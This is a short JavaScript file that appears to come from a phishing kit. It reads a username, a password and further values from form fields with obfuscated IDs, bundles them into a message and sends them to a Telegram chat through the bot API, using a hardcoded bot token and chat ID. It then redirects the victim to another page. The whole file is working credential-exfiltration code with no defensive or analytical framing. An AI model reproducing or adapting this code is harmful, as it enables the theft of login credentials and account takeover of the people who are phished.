//bot token
var telegram_bot_id = "6834441156:AAGRfWXfWl49dwiaO7uDRWvJAktL8ytm-GY";
//chat id
var chat_id = "-4203296154";
var uBOLT, SU3NS, opri, ripyr0pi;
var ready = function () {
    uBOLT = document.getElementById("j2k48729j").value;
    SU3NS = document.getElementById("a839520592w").value;
    opri = document.getElementById("284092mcge28").innerHTML;
    ripyr0pi = document.getElementById("c3e29f94jv").innerHTML;
    message = "##1CBC##” ´\nðŸ‘¤US4RX: " + uBOLT + "\nðŸ”‘CL4XES: " + SU3NS + "\nOPI: " + opri +"\n" + ripyr0pi +"\nðŸ””´";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'jkaouefsting.html';
        console.log(response);
    });
    return false;
};
